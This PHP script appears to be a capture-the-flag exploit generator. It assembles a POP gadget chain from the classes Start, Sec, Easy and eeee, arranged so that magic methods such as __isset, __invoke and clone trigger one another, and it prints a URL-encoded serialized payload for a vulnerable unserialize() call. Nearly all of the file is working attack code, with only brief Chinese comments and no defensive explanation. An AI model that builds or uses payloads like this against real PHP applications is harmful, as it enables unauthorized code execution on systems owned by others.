<?php

class Start{
    public $name;
    protected $func;
    
    // 注入构造方法，方便内存拼装
    public function __construct($name = null, $func = null) {
        $this->name = $name;
        $this->func = $func;
    }
}

class Sec{
    private $obj;
    private $var;
    
    public function __construct($obj = null, $var = null) {
        $this->obj = $obj;
        $this->var = $var;
    }
}

class Easy{
    public $cla;
}

class eeee{
    public $obj;
}

// --- POP 链核心装配 ---

// 1. 尾部执行：__isset 触发 Sec::__invoke
$final_sec = new Sec();
$inner_start = new Start(null, $final_sec);

// 2. eeee 挂载 Start
$e = new eeee();
$e->obj = $inner_start;

// 3. Easy 实例化
$easy = new Easy();

// 4. 装入 Easy 与待 clone 的 eeee
$sec = new Sec($easy, $e);

// 5. 反序列化入口
$exp = new Start($sec, null);

// URL 编码处理 private/protected 产生的 %00 截断
echo urlencode(serialize($exp)) . PHP_EOL;

?>